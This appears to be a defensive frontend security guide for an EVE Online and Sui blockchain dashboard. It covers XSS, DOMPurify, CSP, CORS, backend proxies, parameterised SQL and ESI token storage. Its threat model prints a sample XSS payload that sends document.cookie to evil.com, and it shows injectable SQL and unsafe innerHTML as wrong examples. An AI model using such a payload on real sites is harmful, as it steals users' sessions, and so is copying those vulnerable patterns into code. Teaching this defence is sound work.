# Frontend Security Guide — Frontier Watch Dashboard

## Threat Model

Frontier Watch ingests data from two untrusted external sources:

1. **EVE ESI API** — character names, corp names, item names, descriptions, kill reports
2. **Sui blockchain** — on-chain strings from smart contracts (trade names, warden labels, governance text)

**Any string from these sources must be treated as attacker-controlled input.**

A hostile player in EVE Online can name their character, corporation, or ship:
```
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

If you render that string as HTML, you've handed them your users' sessions.

---

## Rule 1: Never Use dangerouslySetInnerHTML With External Data

```jsx
// WRONG — XSS waiting to happen
function CharacterName({ name }) {
  return <div dangerouslySetInnerHTML={{ __html: name }} />;
}

// RIGHT — React escapes text nodes automatically
function CharacterName({ name }) {
  return <div>{name}</div>;
}
```

`dangerouslySetInnerHTML` is acceptable **only** for content you authored yourself (e.g., static markdown you wrote). Never for ESI or chain data.

---

## Rule 2: Sanitize Before Any HTML Rendering

If you must render formatted content from external sources (e.g., EVE item descriptions that contain some safe HTML), sanitize with DOMPurify:

```bash
npm install dompurify
npm install @types/dompurify  # if TypeScript
```

```jsx
import DOMPurify from 'dompurify';

// Configure a strict allowlist — only safe formatting tags
const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
  ALLOWED_ATTR: [],  // no attributes — eliminates onclick, href, style vectors
};

function ItemDescription({ rawHtml }) {
  const clean = DOMPurify.sanitize(rawHtml, PURIFY_CONFIG);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Key principle:** Default deny. Allow only what you know is safe, not block only what you know is dangerous.

---

## Rule 3: Content Security Policy Headers

CSP is your last line of defense. Even if XSS code executes, CSP can prevent it from doing anything useful (loading external scripts, sending data out, etc.).

### If using Express/Node backend:

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],           // no inline scripts, no external scripts
    styleSrc: ["'self'", "'unsafe-inline'"],  // unsafe-inline needed for most CSS-in-JS
    imgSrc: ["'self'", "data:", "https://images.evetech.net"],  // EVE portrait CDN
    connectSrc: [
      "'self'",
      "https://esi.evetech.net",      // EVE ESI API
      "https://fullnode.mainnet.sui.io"  // Sui RPC
    ],
    objectSrc: ["'none'"],
    frameAncestors: ["'none'"],
  }
}));
```

### If using Vite / served as static files:

Add to your server config (nginx example):

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; connect-src 'self' https://esi.evetech.net; img-src 'self' data: https://images.evetech.net; object-src 'none'; frame-ancestors 'none'";
```

**Test your CSP:** https://csp-evaluator.withgoogle.com/

---

## Rule 4: CORS Configuration

Your backend API should only accept requests from your own frontend domain.

```javascript
const cors = require('cors');

const ALLOWED_ORIGINS = [
  'http://localhost:3000',           // local dev
  'https://frontier-watch.yourdomain.com'  // production
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS: origin not allowed'));
    }
  },
  credentials: true,
}));
```

**Never do this:**
```javascript
app.use(cors()); // allows ALL origins — useless CORS
```

---

## Rule 5: Proxy Your RPC and API Calls

### Problem
If your frontend calls Sui RPC or EVE ESI directly, you expose:
- Your RPC endpoint (can be rate-limit abused)
- Your ESI client credentials (if embedded)
- Your request patterns (intelligence leakage)

### Solution: Backend Proxy

```javascript
// Backend route — frontend calls this, backend calls ESI
app.get('/api/character/:id', async (req, res) => {
  const { id } = req.params;

  // Validate input before using it in an external call
  if (!/^\d+$/.test(id)) {
    return res.status(400).json({ error: 'Invalid character ID' });
  }

  const esiResponse = await fetch(
    `https://esi.evetech.net/latest/characters/${id}/`,
    {
      headers: {
        'Authorization': `Bearer ${process.env.ESI_TOKEN}`, // never sent to frontend
      }
    }
  );

  const data = await esiResponse.json();
  res.json(data);
});
```

Frontend only ever talks to `your-backend.com/api/*` — never to ESI or Sui RPC directly.

---

## Rule 6: Input Validation on All User-Controlled Parameters

Frontier Watch likely has filters, search inputs, or config forms. Validate everything:

```javascript
// WRONG — raw user input passed to query
const results = await db.query(`SELECT * FROM kills WHERE system = '${userInput}'`);

// RIGHT — parameterized query
const results = await db.query('SELECT * FROM kills WHERE system = $1', [userInput]);

// Also validate type and range before it hits the DB
function validateSystemName(input) {
  if (typeof input !== 'string') throw new Error('Invalid type');
  if (input.length > 100) throw new Error('Input too long');
  if (!/^[a-zA-Z0-9\-\s]+$/.test(input)) throw new Error('Invalid characters');
  return input.trim();
}
```

---

## Rule 7: EVE ESI Token Handling

ESI uses OAuth 2.0. The access token is a bearer token — possession = authorization.

```
NEVER:
- Store ESI tokens in localStorage
- Store ESI tokens in sessionStorage  
- Send ESI tokens to the frontend
- Log ESI tokens (even partial)

ALWAYS:
- Store tokens server-side in a secure session or encrypted DB field
- Refresh tokens server-side before expiry
- Scope ESI tokens to minimum required permissions
- Revoke tokens on user logout
```

**Secure session pattern:**

```javascript
// On ESI OAuth callback
app.get('/auth/callback', async (req, res) => {
  const { code } = req.query;
  const tokens = await exchangeCodeForTokens(code);

  // Store server-side — user gets a session cookie, not the token
  req.session.esiAccessToken = tokens.access_token;
  req.session.esiRefreshToken = tokens.refresh_token;
  req.session.esiExpiry = Date.now() + (tokens.expires_in * 1000);

  res.redirect('/dashboard');
});
```

---

## Pre-Submission Frontend Security Checklist

- [ ] Grep codebase for `dangerouslySetInnerHTML` — every instance reviewed
- [ ] DOMPurify installed and applied wherever HTML is rendered from external data
- [ ] CSP headers active and tested in browser DevTools (Network tab → response headers)
- [ ] CORS `origin` whitelist confirmed — not `cors()` with no config
- [ ] No ESI tokens, Sui keys, or API keys in frontend bundle (`npm run build` then `grep -r "key\|token\|secret" dist/`)
- [ ] All Sui RPC calls go through backend proxy
- [ ] All EVE ESI calls go through backend proxy
- [ ] All user inputs validated for type, length, and character set before DB queries
- [ ] Parameterized queries used everywhere — no string interpolation in SQL
- [ ] `npm audit` passes with no critical or high findings
- [ ] ESI tokens stored server-side only, never in localStorage/sessionStorage
